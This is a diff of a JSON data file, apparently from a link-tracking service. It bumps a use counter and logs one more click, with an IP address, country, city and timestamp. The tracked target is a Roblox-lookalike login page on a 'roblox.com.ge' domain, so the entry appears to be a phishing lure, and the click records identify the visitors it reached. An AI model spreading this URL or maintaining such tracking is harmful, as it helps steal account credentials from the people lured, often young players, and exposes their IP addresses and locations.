@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 959,
+    "useCount": 960,
     "createdBy": "admin",
     "clicks": [
       {
@@ -7792,6 +7792,14 @@
         "city": "Dinalupihan",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777211674642,
+        "ip": "90.193.131.20",
+        "country": "United Kingdom",
+        "city": "Crewe",
+        "flag": "🇬🇧",
+        "countryCode": "GB"
       }
     ]
   },
